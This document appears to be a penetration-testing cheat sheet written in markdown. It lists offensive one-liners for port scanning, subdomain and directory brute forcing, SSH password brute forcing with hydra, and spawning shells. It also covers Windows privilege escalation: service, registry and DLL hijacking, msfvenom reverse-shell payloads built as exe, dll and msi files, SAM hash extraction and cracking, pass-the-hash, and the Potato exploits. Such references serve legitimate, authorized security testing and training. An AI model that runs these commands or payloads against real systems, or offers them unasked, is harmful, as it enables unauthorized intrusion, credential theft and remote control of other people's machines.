# PentestingGuide

---

## Bash

Grep emails: `for mail in $(cat MAILS.txt) do; echo $mail | grep -Eho "[[:graph:]]+@[[:graph:]]+"`

----

## Nmap scans

Fast scan: `nmap -p- 500 -T5 -n -Pn HOST -oN allPorts`

Services versions and basic scripts: `nmap -p OPEN_PORTS -sC -sV HOST -oN sCsV`

## DNS 

Subdomains list: https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt

Subdomains bruteforce: `wfuzz -w SUBDOMAINS.txt -H "Host: FUZZ.HOST" --hc 301 -u IP`

## HTTP [80]

Basic info: `whatweb HOST`

Information crawler: `nmap --script http-grep -p80 HOST`

CMS config search: `nmap --script http-config-backup -p80 HOST`

Vuln scanner (https://github.com/scipag/vulscan): `nmap --script vulscan/vulscan -sC -sV -p80 HOST`

Wordpress enum: `nmap --script http-wordpress-enum -p80 HOST`

Directory bruteforce: `gobuster dir --url HOST --wordlist DIRECTORIES.txt`

## SSH [22]

SSH bruteforce: `hydra -l USERS.txt -p PASS.txt HOST ssh`

## SMTP [25]

Connect to SMTP server: `telnet HOST 25`

SMTP enum: Use Metasploit auxiliary/scanner/smtp/smtp_enum

Send email: `swaks --to DST@HOST.COM --from SRC@HOST.COM --header "HEADER" --body "BODY" --server HOST`

----

## Linux 

Spawn a TTY: `python -c 'import pty; pty.spawn("/bin/sh")'`

`/bin/sh -i`

`/usr/bin/script -qc /bin/bash /dev/null`

TCP socket info: `ss -nt`

Linux enumeration: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Is user on the lxd/lxc group?: https://github.com/da3m0nsec/lxdExploit

----

## Windows

Accesschk: https://github.com/da3m0nsec/Tools/blob/master/accesschk.exe 

System info: `systeminfo`

Users info: `net users` `net user USER`

Check my privileges: `whoami /priv`

See running programms: `tasklist`

Generate a reverse shell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o reverse.exe`

Execute a command remotely: `winexe -U 'USER%PASSWORD' //HOST COMMAND`

Execute a command remotely as system: `winexe -U 'USER%PASSWORD' --system //HOST COMMAND`

  ### Port forwarding
  
  plink: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
  
  Forward port: `.\plink.exe USER@RHOST -R RPORT:LHOST:LPORT`

  ### Enumeration

  winPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe

  > For color, reverse shell to Linux, or run this command and restart the Windows console:

  > `reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

  Seatbelt: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Seatbelt.exe

  PowerUp (PS): https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

  > `. .\PowerUp.ps1`

  > `Invoke-AllChecks`

  SharpUp: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/SharpUp.exe
  
  ### Service exploits
  
  It is important to note that even if you are able to modify a proccess, you need to be able to restart it to exploit successfully.
  
  Check users permissions over a service: `.\accesschk.exe /accepteula -ucqv USER SERVICE`
  
  Check users permissions over a folder: `.\accesschk.exe /accepteula -uwdq "PATH"`
  
  Check users permissions over a file: `.\cacls FILE"`
  
  Query the configuration of a service: `sc.exe qc SERVICE`
  
  Query the status of a service: `sc.exe query SERVICE`
  
  Modify a configuration option of a service: `sc.exe config SERVICE OPTION= VALUE`
  
  Start/Stop a service: `net start/stop SERVICE`
  
  ### Service weak registry permissions
  
  Get ACL (PS): `Get-Acl SERVICE | Format-list`
  
  Get ACL: `.\accesschk.exe /accepteula -uvwqk SERVICE`
  
  Check register values of a service: `reg query SERVICE`
  
  Change register entry of a service: `reg add ...`
  
  ### DLL hijacking
  
  Generate reverse shell DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll -o NAME.dll`
  
  ### AutoRuns 
  
  Search for AutoRun programs: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
  
  Check permissions over a program: `.\accesschk.exe /accepteula -wvu "PROGRAM.exe"`
  
  ### AlwaysInstallElevated
  
  Two Registry settings must be enabled:
  
  > HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  
  > HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
  
  Generate reverse shell MSI: `msfvenom -p /windows/x64/shell_reverse_tcp LHOST= LPORT= -f msi -o reverse.msi`
  
  ### Passwords search
  
  Search for passwords in the Registry: `reg query HKLM /f password /t REG_SZ /s` 
  
  `reg query HKCU /f password /t REG_SZ /s`
  
  Recursively search for files in the current directory with the word password: `findstr /si password *.xml *.ini *.txt *.ps1 *.bat *.config`
  
  ### Saved credentials
  
  Query saved credentials: `cmdkey /list`
  
  Run command as other user: `runas /savecred /user:USER COMMAND`
  
  ### Security Account Manager
  
  You should try to find both the SAM and SYSTEM files.
  
  The are on C:\Windows\System32\config, but locked.
  
  Backups may exist on: 
  
  > C:\Windows\Repair
  
  > C:\Windows\System32\config\RegBack
  
  Extract hashes form SAM & SYSTEM (https://github.com/Neohapsis/creddump7/blob/master/pwdump.py): `python2 pwdump.py SYSTEM SAM`
  
  Crack NTLM hash (the second one): `hashcat -m 1000 --force HASH PASSWORDS.txt`
  
  ### Pass the hash
  
  Windows may admit the hash directly instead of needing to crack the password.
  
  Execute a command remotely passing the hash (specify the full hash obtained before): `pth-winexe -U 'FULLHASH' //HOST COMMAND` 
   
  ### Scheduled tasks
  
  List all scheduled tasks your user can see: `schtasks /query /fo LIST /v`
  
  ### Startup apps
  
  Check if we can write to the StartUp folder: `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
  
  Create a shorcut (PS): `powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\NAME.lnk');$s.TargetPath='PROGRAM';$s.Save()"`
  
  ### Hot Potato
  
  This exploit only works on Windows versions from 7 to early 10.
  
  A real guide on how to execute this exploit can be found here (https://foxglovesecurity.com/2016/01/16/hot-potato/) and should be used depending on the Windows version.
  
  Sample exploit (https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe): `\.potato.exe -ip LHOST -cmd "COMMAND" -enable_httpserver true -enable_defender true -enable_spoof ture -enable_exhaust true`
  
  ### Juicy Potato
  
  Juicy Potato: https://github.com/ohpe/juicy-potato
  
  > "If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM."
  
  If the default CLSID doesn't work: https://github.com/ohpe/juicy-potato/tree/master/CLSID
  
  Exploit: `.\JuicyPotato.exe -l LPORT -p COMMAND -t * -c VALIDCLSID`
  
  ### Kernel exploits
  
  Kernel exploits should be your last resource, as they usually are unstable and can crash the system.
  
  You should try to cross-reference the output of the suggester with the precompiled exploits at first.
  
  Exploit suggester (https://github.com/bitsadmin/wesng): 
  
  > `systeminfo > systeminfo.txt`
  
  > `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
  
  Precompiled kernel exploits: https://github.com/SecWiki/windows-kernel-exploits
  
----

## Hashes

Identify hash type: `hash-identifier`

Hash cracker: `hashcat -a ATTACK_MODE -m HASH_TYPE HASH DICTIONARY.txt`

## Zip files

Bruteforce password: `fcrackzip ZIP.zip -D -p PASSWORDS.txt`
